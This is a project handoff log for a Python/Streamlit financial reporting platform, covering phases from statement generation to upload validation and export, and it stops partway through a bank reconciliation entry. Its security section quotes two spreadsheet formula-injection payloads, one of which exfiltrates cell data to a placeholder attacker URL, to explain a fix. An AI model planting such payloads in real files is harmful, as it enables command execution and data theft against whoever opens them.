# PROJECT STATUS / HANDOFF DOCUMENT

## PROJECT OVERVIEW
**Project Name**: Financial Reporting AI  
**Description**: An enterprise-grade AI-powered Financial Reporting, Accounting Analytics & Financial Control Automation Platform built in Python. Designed as a portfolio piece demonstrating advanced accounting/finance expertise merged with scalable Python data engineering and AI anomaly detection capabilities.  
**Tech Stack**: Python, Pandas, NumPy, Matplotlib, Plotly, Scikit-learn, Statsmodels, OpenPyXL, Streamlit.  
**Folder Structure**:
```
financial_reporting_ai/
    data/
        raw/          (Source Excel files)
        processed/    (Classified COA)
        synthetic/    (Demo/synthetic budget data)
    docs/             (Documentation and status files)
    src/              (Python modules for engine and analytics)
    dashboard/        (Streamlit preview apps)
    reports/          (Future output generation folders)
        excel/
        management_reports/
    tests/
    requirements.txt
    README.md
    .gitignore
```

## SOURCE DATA
- **File**: `data/raw/GL_COA_TB_Dummy_Dataset.xlsx`
- **Details**: Contains Chart of Accounts (COA), Opening/Closing Trial Balance (TB), and 200 lines of General Ledger (GL).
- **Period Covered**: Q1 2026 (Single period, no historical data).
- **Scope**: Single currency, no departments/cost centers.
- **Missing Data**: No invoice-level AR/AP data, no bank statement file.
- **Known Data Quirks**:
  - The first 3 rows of every sheet are decorative headers (auto-handled by `data_loader.py` skipping 3 rows).
  - The GL contains a footer `TOTAL` row that has debit and credit values but no account code (auto-stripped by the loader dropping missing account codes).
  - 58% of transactions in the dataset are posted on a weekend (dataset artifact, identified by `controls.py`).

## ARCHITECTURE PRINCIPLES (must never be violated by future phases)
- **No hardcoded column names** — always use `src/data_loader.py`'s `ConfigurableColumnMapper` and `DEFAULT_COLUMN_ALIASES`.
- **No hardcoded account codes** — always use `coa_classified.csv`'s classification dimensions (`bs_category`, `pl_category`, `grouping_label`).
- **Never fabricate data** — any missing data must be strictly labeled as a documented limitation.
- **Synthetic Data Tagging** — synthetic data must always carry a highly visible "SYNTHETIC/DEMO DATA" warning in code comments, file names, and dashboard UI elements.

## PHASE COMPLETION LOG

### Phase 1: Audit Workbook
- **Files Created**: `src/audit_workbook.py`, `phase1_audit_report.md`
- **Key Outputs**: Verified data integrity. Total Debit = Total Credit for all TB columns. Identified 3-row header quirk.
- **Validations Passed**: Debit = Credit.
- **Limitations/Corrections**: Total row in GL initially flagged as dual debit/credit entry; later investigated and safely ignored by loader logic.
- **Status**: COMPLETE / APPROVED

### Phase 2: Chart of Accounts Mapping
- **Files Created**: `src/data_loader.py`, `src/account_classifier.py`, `data/processed/coa_classified.csv`
- **Key Outputs**: 29 accounts mapped successfully without orphans. Discovered Q1 Net Loss of (1,216,800) due to massive salary expenses.
- **Validations Passed**: 0 unclassified accounts, 0 GL/TB orphans, BS Equation reconciled correctly with unclosed P&L Net Income.
- **Limitations/Corrections**: Pandas boolean dtype conflict fixed by creating classification records explicitly. Rule order updated to ensure Contra-Assets evaluate before PPE range rule.
- **Status**: COMPLETE / APPROVED

### Phase 3: Financial Statements Engine
- **Files Created**: `src/profit_loss.py`, `src/balance_sheet.py`, `src/cash_flow.py`
- **Key Outputs**: Net Loss (1,216,800).
- **Validations Passed**: 
  - Balance Sheet matches perfectly (Variance 0.00). 
  - Cash Flow Statement (Indirect Method) reconciles Opening Cash (3,000,000) to Closing Cash (960,100).
- **Limitations/Corrections**: Income tax assumed to be 0.0 (no tax account present).
- **Status**: COMPLETE / APPROVED

### Phase 4: Financial Ratios + Working Capital Analysis
- **Files Created**: `src/ratios.py`, `src/working_capital.py`
- **Key Outputs**: 
  - Current Ratio: 0.62x (Severe liquidity crisis).
  - Net Working Capital: (2,225,400).
  - DPO: 1,826 days (Massive trade payables buildup of $5.7M).
- **Validations Passed**: 17 metrics calculate dynamically without division-by-zero errors.
- **Limitations/Corrections**: Due to single-period data, efficiency and turnover ratios use period-end closing balances instead of averages. Days-based metrics use a 90-day multiplier.
- **Status**: COMPLETE / APPROVED

### Phase 5: AR/AP Analytics + Reconciliation
- **Files Created**: `src/ar_analysis.py`, `src/ap_analysis.py`, `src/reconciliation.py`
- **Key Outputs**: Built scalable architecture functions (`ageing_report()`, `vendor_ageing_report()`, `reconcile_bank()`) that output aggregate data while standing ready to ingest sub-ledger data.
- **Validations Passed**: GL Aggregate balances matched BS outputs.
- **Limitations/Corrections**: Missing invoice-level data and bank statements correctly logged in the UI as limitations. No data was fabricated.
- **Status**: COMPLETE / APPROVED

### Phase 6: Budget vs Actual + Financial Control Analytics
- **Files Created**: `data/synthetic/budget_q1_2026.csv`, `src/generate_budget.py`, `src/budget_vs_actual.py`, `src/controls.py`, `dashboard/preview_phase1_6.py`
- **Key Outputs**: 
  - Built synthetic budget for demonstration of BvA engine.
  - Automated controls found 3 Statistical Outliers (>2.5 std dev), 16 Round-Number Transactions, and 58 Weekend Transactions.
- **Validations Passed**: Findings correctly labeled as "Requires Review" rather than fraud.
- **Limitations/Corrections**: Manual Journals and Backdated Transactions flagged as untestable due to lack of `Post Date` and `Journal Source` fields in the raw data.
- **Status**: COMPLETE / APPROVED

### Phase 7: AI Anomaly Detection + Forecasting
- **Files Created**: `src/anomaly_detection.py`, `src/forecasting.py`, `dashboard/preview_phase1_7.py`
- **Key Outputs**: 
  - ML Anomaly Detection identified 4 transactions using Isolation Forest (Z-score scaled).
  - Basic moving average forecast engine built and backtested (illustrative MAE metric).
- **Validations Passed**: ML anomalies overlap conceptually with statistical outliers but adjust dynamically for multi-dimensional variances.
- **Limitations/Corrections**: ML model strictly flags "Potential Anomalies", not confirmed fraud. Forecast dashboard includes a prominent warning that 3 months of data is insufficient for real prediction.
- **Status**: COMPLETE / APPROVED

### Phase 8: Scenario Analysis + Dashboard Consolidation
- **Files Created**: `src/scenario_analysis.py`, `dashboard/app.py`
- **Files Deleted**: All incremental `dashboard/preview_phase1_X.py` files were deleted to establish `app.py` as the canonical entry point.
- **Key Outputs**: 
  - Dynamic FP&A Scenario engine calculating Base, Best, and Worst case outcomes across Revenue, Profit, Cash, and Current Ratio based on adjustable assumptions.
  - Consolidated all previous 14 sections into a clean, 6-tab Streamlit application.
- **Validations Passed**: Sidebar navigation seamlessly loads all respective modules. All warning banners regarding single-period and synthetic data were strictly preserved.
- **Limitations/Corrections**: Cash Flow impact in the Scenario Analysis is simplified to AR/AP/Net Profit movements for demonstration purposes.
- **Status**: COMPLETE / APPROVED

### Phase 9: Professional Excel Export Module
- **Files Created**: `src/reporting.py`, `reports/excel/financial_report_Q1_2026.xlsx`
- **Files Modified**: `dashboard/app.py` (Export to Excel button + download link added to sidebar)
- **Key Outputs**: 
  - 15-sheet Excel workbook with professional formatting: bold headers, navy colour scheme, currency/date number formats, freeze panes, auto-filters on transaction sheets, totals rows highlighted, conditional formatting (Balance Sheet green/red validation, Financial Ratios red-flag on Current Ratio <1.0x).
  - Sheet 11 (Budget vs Actual) carries a prominent amber "SYNTHETIC / DEMO DATA" cell banner. Sheet 10 (AR & AP) carries the sub-ledger limitation note as a formatted cell.
  - Management Summary (Sheet 15) includes a plain-language business narrative with top 3 recommendations.
- **Validations Passed**: 15 sheets confirmed present. Workbook opens cleanly.
- **Limitations/Corrections**: All pre-existing data limitations are documented inside the relevant sheets as formatted cell notes. Synthetic data banner confirmed on Sheet 11.
- **Status**: COMPLETE / APPROVED

### Phase 10: Testing, Documentation & GitHub Packaging
- **Files Created**: `src/month_end_close.py`, `tests/test_financials.py`, `docs/architecture.md`, `docs/accounting_logic.md`, `docs/methodology.md`, `README.md`, `interview_materials.md`.
- **Files Modified**: `dashboard/app.py` (Added Section 15: Month-End Close), `.gitignore`, `requirements.txt`.
- **Key Outputs**:
  - Dynamic Month-End Close checklist built based on verifiable dataset presence.
  - Python `unittest` suite validating Trial Balance balancing, P&L calculations, Balance Sheet equity injection, Cash Flow reconciliation, and COA mapping logic.
  - Comprehensive Markdown documentation (architecture, logic, AI methodology, GitHub README, and interview preparation materials).
  - Production-ready `.gitignore` excluding raw data to prevent sensitive leaks.
- **Validations Passed**: 100% of unit tests pass (6 tests). `.gitignore` successfully blocks `data/raw/*`.
- **Status**: COMPLETE / APPROVED

## UPLOAD FEATURE — PHASE LOG

### UP1: File Upload Interface + Detection + Column Mapping
- **Files Created**: `src/file_detector.py`, `src/column_mapper.py`, `src/file_upload.py`
- **Files Modified**: `dashboard/app.py` (Added "Upload Financial Data" to sidebar navigation)
- **Key Outputs**:
  - `file_detector.py`: Heuristic file-type detector using `ConfigurableColumnMapper.build_rename_map()`. Scores each detected type by weighted required/supporting column matches. GL: 92.9% confidence on test data. TB: 85.7%. COA: correct. Returns `(detected_type, confidence_score, rename_map)`.
  - `column_mapper.py`: Extends the existing mapper for interactive UI context. Builds editable mapping table (source → canonical). Applies user overrides via `st.data_editor`.
  - `file_upload.py`: Streamlit UI component. Supports CSV/XLSX/XLS. Multi-sheet Excel shows a sheet selector dropdown. Renders File Summary metrics card, confidence progress bar, 20-row preview, and interactive column mapping table.
  - Session state keys set: `uploaded_df_raw`, `uploaded_df_mapped`, `uploaded_override_map`, `uploaded_detected_type`, `uploaded_confidence`, `uploaded_sheet`.
- **Architecture compliance**: Does NOT touch any existing financial modules. Extends `ConfigurableColumnMapper` and `DEFAULT_COLUMN_ALIASES` from `data_loader.py` directly — no second mapping system created.
- **Validations Passed**: All 3 new modules import cleanly. Existing 8 sections unaffected. GL detection 92.9%, TB detection 85.7% on test DataFrames.
- **Limitations**: Phase 1 is display-only. No data is pushed into the engine. That is Phase 2 (COA Validation) and Phase 3 (Engine Integration).
- **Status**: COMPLETE / APPROVED

### UP2: COA Mapping + Validation + User Review Screen
- **Files Created**: `src/coa_mapper.py`, `src/validation_engine.py`
- **Files Modified**: `src/file_upload.py` (added `render_review_screen()` + UP2 imports; replaced the stale "Phase 1 complete" banner), `dashboard/app.py` (one additive line exposing the live classified COA to the upload feature)
- **Key Outputs**:
  - `coa_mapper.py`: Pure-logic COA comparison. Buckets every account in an upload as **Matched** (in the reference COA), **New** (not in the COA but carrying a user-confirmed category), **Unmapped** (no COA entry and no confirmed category → "Mapping Required"), and flags **Duplicate** account codes where uniqueness is expected. Resolves its reference COA in order: live in-memory classified COA → `data/processed/coa_classified.csv` → unavailable (degraded, stated explicitly). The 7 manual categories (Asset/Liability/Equity/Revenue/COGS/Expense/Other) translate to the engine's own `financial_statement` / `bs_category` / `pl_category` fields via `CATEGORY_TO_ENGINE`, so UP3 inherits one vocabulary rather than a parallel scheme.
  - **Persistence**: user-confirmed mappings are written to `data/processed/user_coa_mappings.json`, keyed by `source_key = slot::file_name` for exact recall on re-upload, with a cross-source `global` fallback that is offered but flagged for confirmation rather than applied silently.
  - `validation_engine.py`: Pure-logic validation returning a `ValidationReport` (PASS / WARNING / ERROR). Checks: missing values, duplicate transactions, invalid account codes, invalid dates, debit/credit format (both sides populated / neither), non-numeric amounts, unmapped accounts, and unbalanced journals (per `voucher_no`/`txn_no` plus the dataset total). GL reports Total Debit / Total Credit / Difference; TB additionally reports Opening, Period and Closing control totals. Amount coercion tolerates thousands separators, currency symbols and parenthesised negatives.
  - `file_upload.py`: 5-tab review screen — Data Preview (mapped/canonical, distinct from UP1's raw preview), Validation Results, Account Mapping (with a category dropdown + "Save Account Mappings"), Errors, Warnings — plus a **Process File** button that is disabled while any error or unmapped account remains and otherwise shows a confirmation only.
- **Architecture compliance**: Both new modules are free of any `streamlit` import (verified: they import with streamlit absent), keeping logic unit-testable and confining rendering to `file_upload.py`. Required-field definitions are reused from `column_mapper.REQUIRED_FIELDS_BY_TYPE`, not restated. No existing financial module was touched. **No account is ever auto-assigned a category** — an account the reference COA does not know is returned as "Mapping Required" for a human.
- **Honesty rule added**: a check that could not run (column absent, no reference COA) is recorded in `checks_skipped` with a reason and shown in the UI as "Skipped — not verified"; it is never counted as a pass. A missing reference COA additionally downgrades the overall status to WARNING so an unverifiable upload is never reported as clean.
- **Validations Passed**:
  - All 8 dashboard sections render with no exception via `streamlit.testing.v1.AppTest`; the sidebar section list is unchanged from the UP1 baseline in both names and order.
  - Clean GL → PASS (Dr 250,000 = Cr 250,000), Process File enabled.
  - Messy GL → ERROR with 7 errors / 2 warnings, Process File disabled: blank account code, non-numeric debit, unparseable date, unknown account 9999, unmapped account pending a category, 4 unbalanced journals, and a 900.00 overall imbalance; plus zero-value rows and a duplicated transaction as warnings.
  - Wrong column names → detection correctly falls to "Other / Unknown" (7.1% confidence) and validation reports the 3 unmapped required columns as a single blocking error.
  - Clean TB → PASS across Opening (680,000), Period (845,000) and Closing (960,000) control totals.
  - Persistence round-trip verified: an account confirmed as "Expense" is re-read from JSON on the next upload and reported as **New / Remembered — this source** instead of Unmapped.
  - **Verified against the restored production dataset**: the real General Ledger sheet re-uploaded through UP2 detects at 100% confidence, maps 26/26 accounts as Matched and reports PASS (Dr 10,256,300 = Cr 10,256,300). The real Trial Balance sheet detects at 100%, maps 29/29 Matched and passes all three control totals (Opening 7,550,000 / Period 10,256,300 / Closing 13,406,300).
  - Cross-checked against an unrelated external GL export (2,000 rows, 5 accounts): correctly Matched 4000/5000/6000 against the real COA and held 4010 "Online Sales" and 5010 "Travel Expense" as **Mapping Required** rather than guessing — the intended behaviour on genuinely unknown accounts.
- **Limitations/Corrections**:
  - **Source dataset restored.** `data/raw/GL_COA_TB_Dummy_Dataset.xlsx` was supplied by the user and reinstated. It reproduces every documented figure exactly — Revenue 897,000.00, COGS 282,600.00, Gross Profit 614,400.00, Net Profit (1,216,800.00), Total Assets 10,509,300.00, Closing Cash 960,100.00 — across 29 COA accounts, 29 OTB / 29 TB rows and 200 GL lines, with 0 unclassified accounts and 0 load warnings. `tests/test_financials.py` now passes **6/6**. UP2 was re-verified end-to-end against this real data after an interim synthetic stand-in was used and deleted.
  - `data/processed/coa_classified.csv` regenerated from the restored dataset via `python -m src.account_classifier` (29 accounts, 0 unclassified). UP2 resolves it from disk; the session-state hand-off added to `dashboard/app.py` remains as the in-memory fast path.
  - `data/raw/.gitkeep` and `data/processed/.gitkeep` created so a fresh clone has both directories (`.gitignore` already un-ignores them, but neither existed).
  - **Correction found via real data**: the `missing_values` check originally flagged blank `debit` / `credit` cells in a General Ledger, which fired on 200 of 200 rows of the real GL — a blank opposite side is the normal shape of double entry, not a defect. Those two fields are now exempt for the `general_ledger` slot; a row blank on **both** sides is still caught by the debit/credit format check. Re-verified that the messy fixture still raises all 7 of its errors.
  - Known gap identified here (camelCase headers not matching their aliases) was subsequently **fixed under Housekeeping H1-H3 below**.
  - Correction to the UP1 log above: the "Session state keys set" line is stale. The shipped UP1 code stores uploads as `st.session_state["uploads"][slot]` with keys `df_raw`, `df_mapped`, `override_map`, `file_name`, `detected_type`, `confidence`, `sheet` — not the flat `uploaded_*` keys listed. UP2 consumes the real structure.
  - Pre-existing, untouched: `requirements.txt` is UTF-16 encoded (a PowerShell `pip freeze >` artifact), which makes `pip install -r requirements.txt` fail on most systems. Out of UP2 scope — flagged, not changed.
- **Status**: COMPLETE / APPROVED

### UP3: Dataset Manager (Separate/Append) + Engine Hookup
- **Files Created**: `src/dataset_manager.py`
- **Files Modified**: `src/file_upload.py` (replaced UP2's confirmation-only Process block with `render_process_section()`), `dashboard/app.py` (dataset registry + sidebar selector; engine calls now run against the active dataset)
- **Key Outputs**:
  - **Dataset mode selection** on Process File. *Analyze Separately* creates an isolated dataset; *Add to Existing Dataset* appends ledger rows to a copy of a base dataset. Append is offered **only** for a General Ledger (`APPENDABLE_SLOTS`) — for a Trial Balance or Chart of Accounts the option is withheld with an explanation, since appending one period's balances onto another's is not a valid accounting operation.
  - **Duplicate detection** (`detect_duplicates`) classifies every incoming row against the base ledger on `date`, `account_code`, `debit`, `credit`, corroborated by `voucher_no` and `narration` where mapped: **Confirmed Duplicate** (every matched field identical), **Possible Duplicate** (core match, different voucher/narration), **New Transaction**. All three counts and the matching rows themselves are shown. **Nothing is removed automatically** — two visible checkboxes control inclusion, the resulting row count is stated before the button, and an append that would add nothing is blocked with an explicit error.
  - **Engine hookup**: `compute_statements()` is the single place the engine sequence is expressed and calls the existing `generate_profit_loss`, `generate_balance_sheet`, `generate_cash_flow`, `calculate_ratios` and `analyze_working_capital` unchanged. `dashboard/app.py` now calls it too, so the dashboard and the upload path share one code path rather than parallel implementations.
  - **Trial balance reconstruction**: `tb_from_gl()` rebuilds a TB from ledger movements. Two identities verified in the source data drive it — `closing_net == opening_net + period_net` and `GL debit/credit per account == TB period_debit/period_credit` — so an append carries opening balances from the base and re-derives closing as opening + combined period movement rather than mutating balances.
  - **UP2 → UP3 hand-off**: accounts a user categorised in UP2 are translated into the engine's COA schema through `coa_mapper.CATEGORY_TO_ENGINE` by `extend_coa()`, so no parallel classification vocabulary exists.
  - **Dataset selector** in the sidebar. Switching it recalculates **all 8 sections**, not just the upload screen. A non-original dataset renders a persistent banner plus an expander listing its limitations.
- **Immutability design**: `build_original_dataset()` deep-copies the workbook; `register()` refuses to replace the original and suffixes colliding names instead of overwriting; `build_appended_dataset()` concatenates onto a **copy** of the base ledger and returns a new `Dataset`. An upload can only ever ADD to the registry.
- **Architecture compliance**: `dataset_manager.py` has no `streamlit` import (verified alongside `coa_mapper` and `validation_engine`); all rendering stays in `file_upload.py` / `app.py`. No accounting logic is reimplemented.
- **Validations Passed**:
  - **(a) Real TB sheet → "Analyze Separately"**: reproduces the original **exactly** — Revenue 897,000.00, Net Profit (1,216,800.00), Total Assets 10,509,300.00, balanced, cash flow reconciled. This is the strongest available proof that the upload path and the dashboard path reach the engine identically. Limitation correctly stated: a TB carries no ledger, so Control Analytics, AI Anomaly Detection and Forecasting are not meaningful for it.
  - Real GL sheet → "Analyze Separately": P&L matches the original exactly (P&L accounts genuinely open at zero); Total Assets differs (3,559,300 vs 10,509,300) because opening balances are absent, and that is reported as a limitation.
  - **(b) Duplicate detection**: re-uploading the identical 200-row GL as an append returns **200 Confirmed Duplicates / 0 New**, and the Process button is disabled with "Every incoming row was excluded". A mixed file of 6 new Q2 rows + 3 re-sent rows returns **6 New / 3 Confirmed**. Ticking "append anyway" then appending 200 rows produced a dataset with exactly doubled figures (Revenue 1,794,000, Net Profit (2,433,600)) — confirming the append genuinely applied.
  - **(c) Dataset switching**: Original → TB Upload → Q1+Q2 Combined → Original. All 8 sections render at every step. The combined dataset genuinely recalculates (Gross Profit 485,500 vs 614,400; Net Profit (1,406,600); Current Ratio 0.60x vs 0.62x; DPO 1,254 vs 1,826), and switching back restores **897,000 / 614,400 / (1,216,800) / 960,100 / 0.62x exactly**.
  - **Original never silently altered**: verified after building separate datasets, after duplicate detection, and after an append that doubled the ledger — original still 200 GL rows, 29 TB rows, Net Profit (1,216,800.00), Total Assets 10,509,300.00.
  - Full prior-phase regression re-run: `tests/test_financials.py` 6/6; sidebar section list unchanged; all four UP2 fixtures byte-identical (clean GL PASS, messy GL 7 errors/2 warnings, wrong-headers 1 error, clean TB PASS); H3 alias check 86/86.
- **Limitations/Corrections**:
  - **Correction found in testing**: the GL-without-opening-balances limitation originally claimed the Balance Sheet "will not balance". It **does** balance — ledger movements are double-entry by construction — it simply describes period *movement* rather than closing *position*. The text was corrected; stating a wrong limitation is as misleading as stating none.
  - The 7 upload categories do not distinguish current from non-current, so a manually-categorised Asset/Liability/Equity account is assumed **current** (balance-sheet aggregation keys off `bs_sub_category`). Reported per-account as a dataset limitation rather than applied silently. Accounts categorised **Other** carry no statement placement and are excluded from the P&L and Balance Sheet.
  - Day-count ratios (DSO/DPO/DIO) still use the 90-day divisor on appended datasets, so they understate the period if the combined data spans more than one quarter. Reported as a limitation on every appended dataset.
  - Datasets live in `st.session_state` and do not survive a browser refresh. Persistence and an upload audit trail are UP4.
  - Excel export follows the active dataset and is disabled for a dataset with no ledger (the report includes ledger-driven sheets).
- **Status**: COMPLETE / APPROVED

### UP4: Multi-file Upload + Duplicate Prevention + Upload History / Audit Trail
- **Files Created**: `src/upload_history.py`
- **Files Modified**: `src/file_upload.py` (multi-file staging, file-level duplicate check, audit recording, `render_history_panel()`)
- **Scope note**: two of the five items listed for UP4 were already delivered by UP3 and were re-verified rather than rebuilt — **Dashboard integration (dynamic refresh)** and the **Dataset Selector** (switching recalculates all 8 sections). **Duplicate prevention** was half-done: UP3 detects duplicate *rows*, UP4 adds duplicate *files*. Genuinely new here: multi-file upload, file-level duplicate prevention, and the audit trail.
- **Key Outputs**:
  - `upload_history.py`: append-only audit trail persisted to `data/processed/upload_history.json`. Each entry records timestamp, file name, SHA-256 fingerprint, sheet, detected type, confidence, rows/columns, validation status, error and warning counts, processing mode, resulting dataset, outcome, rows appended, duplicates excluded and notes. Trimmed to the most recent 500 entries. A missing or corrupt trail yields an empty one rather than blocking an upload.
  - **File-level duplicate prevention**: the uploaded **bytes** are fingerprinted, so a renamed copy of the same file is still recognised. The check is scoped to the selected sheet, because one workbook legitimately yields a GL dataset and a TB dataset — that is not a duplicate. It reports what happened to the file last time (and which dataset it became) but never blocks; the user decides.
  - **Multi-file / monthly upload**: the uploader accepts multiple files and stages them in a table, with a selector to work through them one at a time. Each file still runs the identical single-file pipeline (detect → map → validate → review → process), so the UP1–UP3 path is unchanged.
  - **Upload History panel**: headline counts (Total / Processed / Blocked / Distinct Files), the full table newest-first, and a CSV download of the trail.
- **Anti-spam guard**: Streamlit re-runs the whole script on every interaction, so a naive audit write would log a fresh "Blocked" row each time a user ticked a checkbox. Non-forced records are de-duplicated per session against the (file, sheet, slot, outcome, status) they describe; genuine one-off actions such as processing a dataset are forced through.
- **Validations Passed**:
  - All 8 dashboard sections render; sidebar section list unchanged; `tests/test_financials.py` 6/6; dataset switching still restores the original exactly.
  - Audit entry written correctly on a real process click — 200 rows, PASS, 0 errors, mode *Analyze Separately*, dataset name and fingerprint all captured.
  - **Duplicate prevention**: re-uploading the identical workbook produces "This exact file was already uploaded on … and processed into dataset …". Uploading a **different sheet of the same workbook** correctly produces **no** duplicate warning.
  - **Blocked path**: the messy fixture records exactly one `Blocked by validation` entry (ERROR, 7 errors, 2 warnings, notes "7 validation error(s); 1 unmapped account(s)") and stays at **one** entry across three forced re-runs — the guard works.
  - UP3 append flow re-verified after UP4's signature changes: 200 Confirmed Duplicates on re-upload, original still 200 GL rows / Net Profit (1,216,800.00) / Assets 10,509,300.00.
  - Test runs redirected the history path to a scratch file; `data/processed/` contains no test artifacts.
- **Limitations/Corrections**:
  - **Monthly batch is sequential, not one-click.** Staging several files does not auto-merge them. To build one combined dataset the user processes the first file, then processes each subsequent file with *Add to Existing Dataset* targeting the dataset the previous file created. This was deliberate: a silent auto-merge would bypass the per-file validation and duplicate review that UP2/UP3 exist to enforce.
  - **Datasets remain session-scoped.** The audit trail persists across a browser refresh; the datasets themselves do not. Writing uploaded financial data to disk is a security and privacy decision that belongs in UP6, not a change to make implicitly here.
  - The audit trail contains file names, account-level counts and dataset names. `data/processed/` is gitignored, so it never reaches the repository — to be re-examined under UP6.
- **Status**: COMPLETE / APPROVED

### UP5: Error Handling + Rule-Based Interpretation & Insights + Analytics Integration
- **Files Created**: `src/insights_engine.py`
- **Files Modified**: `dashboard/app.py` (insights panel, safe metric lookups, engine-failure fallback)
- **Design decision (user-selected)**: interpretation is **rule-based, not LLM-backed**. Every insight is a deterministic function of figures the engine already computed, so it is reproducible, testable and explainable line by line; no external service is called and no financial data leaves the machine. This fits the platform's governing rule that nothing is fabricated, and it keeps UP6's security posture simple — there is no API key and no outbound data path to secure.
- **Key Outputs**:
  - `insights_engine.py`: rules across Liquidity, Profitability, Working Capital, Cash and Data Quality. Each `Insight` carries a severity (CRITICAL / WARNING / WATCH / POSITIVE / INFO), a headline, a plain-language explanation, the **evidence** it used, and where warranted a recommendation. Findings are ranked by severity.
  - Insights that go beyond restating a ratio, e.g.: *"Gross margin of 68.5% is healthy — the loss is an overhead problem, not a pricing one"* (derived by comparing gross profit against the overhead base); *"Net loss of 1,216,800 … the single largest cost is Salaries & Employee Benefits at 1,048,200, equal to 117% of revenue"* (driver identified from the P&L); and *"Negative cash conversion cycle of (1,212) days is not a sign of efficiency here"* — which prevents a metric that normally reads as a strength being reported as one when it is produced by unpaid suppliers.
  - **Automated Interpretation** panel on the Executive Summary: severity counts, expandable findings (criticals open by default), evidence caption under each, and a full findings table.
- **Honesty rules built into the engine**:
  1. A rule whose inputs are missing does not fire — silence rather than a guess.
  2. **Position-dependent insights are suppressed** for a dataset whose balance sheet reflects period movement rather than closing position (a GL uploaded without opening balances). Liquidity, working-capital and cash findings are withheld and replaced by one insight explaining why, while profitability findings still fire because P&L accounts genuinely open at zero. Verified: a GL-only dataset yields Profitability + Data Quality findings only.
  3. Every insight carries its evidence, so any figure on screen traces back to the statement it came from.
- **Error handling hardened**:
  - **Engine-failure fallback**: a malformed dataset previously replaced the whole dashboard with "Application Error" — including the selector needed to escape it. `compute_statements()` is now guarded; on failure the app names what broke, falls back to the original dataset and stays fully usable. Verified with a deliberately malformed dataset: all 8 sections remained usable and the original's figures displayed.
  - **Unguarded `.iloc[0]` lookups removed** from the Executive Summary. Cash Balance, Current Ratio, DSO and DPO were read positionally and would raise `IndexError` on any dataset lacking those rows; they now degrade to "n/a".
  - The Executive Summary header was hardcoded to "(Q1 2026)" and the COA expander still showed the original COA regardless of the selected dataset. Both now follow the active dataset.
- **Anomaly detection + forecasting integration**: confirmed these run against uploaded datasets, not just the original — a GL upload produces 4 ML-flagged transactions and control tests across its own 200 ledger lines. A Trial Balance upload degrades to three explicit "no transaction-level ledger" notices instead of crashing.
- **Validations Passed**: all 8 sections render; sidebar list unchanged; `tests/test_financials.py` 6/6; dataset switching still restores the original exactly (897,000 / 614,400 / (1,216,800) / 960,100 / 0.62x); insights panel reports 5 Critical / 6 Warning on the original dataset.
- **Limitations**: the rules encode conventional thresholds (current ratio 1.0/1.5, DSO 60 days, DIO 120 days, DPO 90 days, gross margin 40%). These are reasonable general benchmarks, **not** industry-calibrated — a 90-day DPO is unremarkable in construction and alarming in retail. Thresholds are module-level constants in the rule functions and should be tuned per industry before the output is relied on commercially.
- **Status**: COMPLETE / APPROVED

### UP6: Excel Export Update + Security/Privacy + Acceptance Testing
- **Files Created**: `src/security.py`, `tests/test_acceptance.py`
- **Files Modified**: `src/reporting.py` (Sheet 15 rewritten, export sanitised), `src/file_upload.py` (audit CSV sanitised), `dashboard/app.py` (dataset context passed to export)
- **Excel export**:
  - **Bug found and fixed**: Sheet 15 (Management Summary) was a **hardcoded narrative describing the original Q1 2026 dataset**. Exporting any other dataset produced a workbook whose summary contradicted its own sheets. It is now generated from the live figures by the UP5 insights engine, titled with the dataset being exported.
  - **Factual error corrected**: the hardcoded text claimed *"Salaries alone ($1,048,200) represent 170% of revenue"*. The true figure is **117%** (1,048,200 / 897,000) — an overstatement of 53 percentage points that had been shipping in every exported report. The computed insight now states 117%.
  - Verified: 15 sheets preserved; exporting the appended dataset shows **its** net profit (1,406,600) and not the original's; control findings and limitations are carried through from the dataset actually exported.
- **Security / Privacy**:
  - **Formula injection (CWE-1236) closed.** Uploaded free-text fields (narration, account names, file names) flowed untouched into the Excel export and the audit-trail CSV. A narration of `=cmd|'/c calc'!A1` or `=HYPERLINK("http://attacker/?x="&A1,…)` is inert inside the app but becomes a **live formula** when a colleague opens the exported workbook, capable of exfiltrating adjacent cells. `src/security.py` applies the OWASP remedy — prefix with an apostrophe so the value renders as literal text — at the single `_df_to_sheet` write point and on the audit CSV. Verified end to end: payloads injected into an uploaded GL survived upload → append → export and landed **neutralised, 0 live formulas**. Negative numbers ("-1,234.50") are explicitly exempt so figures are not corrupted into strings.
  - **No outbound data path**: confirmed by grep that `src/` contains no `requests`/`urllib`/`httpx`, no LLM SDK and no API key. The rule-based decision in UP5 means financial data never leaves the machine.
  - **Data at rest**: `data/raw/`, `data/processed/` (classified COA, user mappings, audit trail) and `reports/excel/` are all gitignored and confirmed so by `git check-ignore`.
- **OUTSTANDING PRIVACY ISSUE — needs a user decision**: `reports/excel/financial_report_Q1_2026.xlsx` and `reports/phase1_audit_report.json` are **tracked in git** despite `.gitignore` excluding `reports/excel/*`. They were committed before the ignore rule existed, and `.gitignore` does not untrack files already in the index. Both contain the full financial dataset and are present in the public GitHub repository. `git rm --cached` stops future tracking but **does not remove them from git history** — that needs a history rewrite and force-push, which has not been done. Harmless for this dummy dataset; the same pattern with real client data would be a reportable disclosure.
- **Acceptance testing**: `tests/test_acceptance.py` — 42 criteria across baseline integrity, UP1 detection/mapping, UP2 validation/COA, UP3 dataset manager, UP4 history/duplicates, UP5 insights/error handling, UP6 export/security, and dashboard rendering. Self-contained (builds its own malformed fixture and generates its own export). **42/42 pass.**
- **Status**: COMPLETE / AWAITING USER REVIEW

### BR: Bank Reconciliation — Month-End Close Item 1
- **Files Created**: `src/bank_reconciliation.py`
- **Files Modified**: `src/reconciliation.py` (rewritten to delegate), `src/data_loader.py` (4 bank canonical columns), `src/file_detector.py` (Bank Statement signature), `src/column_mapper.py`, `src/validation_engine.py`, `src/file_upload.py` (bank_statement slot), `src/month_end_close.py`, `dashboard/app.py` (Sub-Ledgers reconciliation view), `tests/test_acceptance.py` (+9 criteria)
- **Trigger**: the Month-End Close checklist showed Bank Reconciliation as *Pending* with "Module (reconciliation.py) is built and ready". It was not ready — `reconcile_bank()` ended in a bare `pass`, so supplying a statement returned `None`.
- **Two bugs found and fixed**:
  1. **Wrong bank balance.** `analyze_reconciliation()` selected accounts with `account_name.contains("Bank")`, which also matched **2200 Loan Payable - Bank** (a liability) and **5800 Bank Charges** (an expense). The dashboard reported a bank balance of **(131,400)** against a true figure of **596,100** — an error of **727,500**. Selection is now driven by the COA classification (`grouping_label == "Cash & Cash Equivalents"`), narrowed by name only within cash accounts.
  2. **`reconcile_bank()` was a stub** returning `None` whenever a statement was actually supplied. It now performs a real reconciliation and returns the reconciliation statement.
- **Key Outputs**:
